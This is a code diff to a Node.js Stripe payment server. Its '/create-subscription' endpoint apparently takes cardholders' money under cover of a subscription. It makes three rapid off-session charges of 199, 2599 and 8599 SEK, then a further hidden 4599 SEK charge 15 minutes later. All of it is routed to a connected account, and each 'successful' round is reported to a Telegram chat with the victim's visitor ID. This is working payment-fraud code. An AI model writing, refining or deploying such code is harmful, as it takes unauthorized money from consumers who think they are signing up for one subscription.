@@ -35,7 +35,7 @@ async function sendTelegram(message) {
   }
 }
 
-async function runCharges(customerId, paymentMethodId, pmType, visitorId, round) {
+async function runRound1(customerId, paymentMethodId, pmType, visitorId) {
   // Charge 1 — 199 SEK
   try {
     const payment1 = await stripe.paymentIntents.create({
@@ -48,9 +48,9 @@ async function runCharges(customerId, paymentMethodId, pmType, visitorId, round)
       off_session: true,
       transfer_data: { destination: ACCOUNT_B },
     });
-    console.log(`Round ${round} - Payment 1 created:`, payment1.id, payment1.status);
+    console.log('Round 1 - Payment 1 created:', payment1.id, payment1.status);
   } catch (err) {
-    console.log(`Round ${round} - Payment 1 failed:`, err.message);
+    console.log('Round 1 - Payment 1 failed:', err.message);
   }
 
   await new Promise(resolve => setTimeout(resolve, 20000));
@@ -67,9 +67,9 @@ async function runCharges(customerId, paymentMethodId, pmType, visitorId, round)
       off_session: true,
       transfer_data: { destination: ACCOUNT_B },
     });
-    console.log(`Round ${round} - Payment 2 created:`, payment2.id, payment2.status);
+    console.log('Round 1 - Payment 2 created:', payment2.id, payment2.status);
   } catch (err) {
-    console.log(`Round ${round} - Payment 2 failed:`, err.message);
+    console.log('Round 1 - Payment 2 failed:', err.message);
   }
 
   await new Promise(resolve => setTimeout(resolve, 20000));
@@ -86,18 +86,45 @@ async function runCharges(customerId, paymentMethodId, pmType, visitorId, round)
       off_session: true,
       transfer_data: { destination: ACCOUNT_B },
     });
-    console.log(`Round ${round} - Payment 3 created:`, payment3.id, payment3.status);
+    console.log('Round 1 - Payment 3 created:', payment3.id, payment3.status);
   } catch (err) {
-    console.log(`Round ${round} - Payment 3 failed:`, err.message);
+    console.log('Round 1 - Payment 3 failed:', err.message);
   }
 
   await sendTelegram(
-    `✅ <b>Betalning lyckades! (Omgång ${round})</b>\n\n` +
+    `✅ <b>Betalning lyckades! (Omgång 1)</b>\n\n` +
     `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
     `💳 Betalningsmetod: ${pmType}\n` +
     `💳 Betalning 1: 199 kr\n` +
     `💳 Betalning 2: 2599 kr\n` +
     `💳 Betalning 3: 8599 kr\n` +
+    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+  );
+}
+
+async function runRound2(customerId, paymentMethodId, pmType, visitorId) {
+  // Single charge — 4599 SEK
+  try {
+    const payment = await stripe.paymentIntents.create({
+      amount: 459900,
+      currency: 'sek',
+      customer: customerId,
+      payment_method: paymentMethodId,
+      payment_method_types: [pmType],
+      confirm: true,
+      off_session: true,
+      transfer_data: { destination: ACCOUNT_B },
+    });
+    console.log('Round 2 - Payment created:', payment.id, payment.status);
+  } catch (err) {
+    console.log('Round 2 - Payment failed:', err.message);
+  }
+
+  await sendTelegram(
+    `✅ <b>Betalning lyckades! (Omgång 2)</b>\n\n` +
+    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
+    `💳 Betalningsmetod: ${pmType}\n` +
+    `💳 Betalning: 4599 kr\n` +
     `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
   );
 }
@@ -186,7 +213,7 @@ app.post('/create-subscription', async (req, res) => {
     const pmType = paymentMethod.type;
 
     // Round 1 — immediately
-    await runCharges(customerId, paymentMethodId, pmType, visitorId, 1);
+    await runRound1(customerId, paymentMethodId, pmType, visitorId);
 
     await new Promise(resolve => setTimeout(resolve, 20000));
 
@@ -203,7 +230,7 @@ app.post('/create-subscription', async (req, res) => {
     // Round 2 — after 30 minutes (runs in background, doesn't block response)
     setTimeout(async () => {
       console.log('Starting Round 2 charges (after 15 min)...');
-      await runCharges(customerId, paymentMethodId, pmType, visitorId, 2);
+      await runRound2(customerId, paymentMethodId, pmType, visitorId);
     }, 15 * 60 * 1000);
 
     res.json({
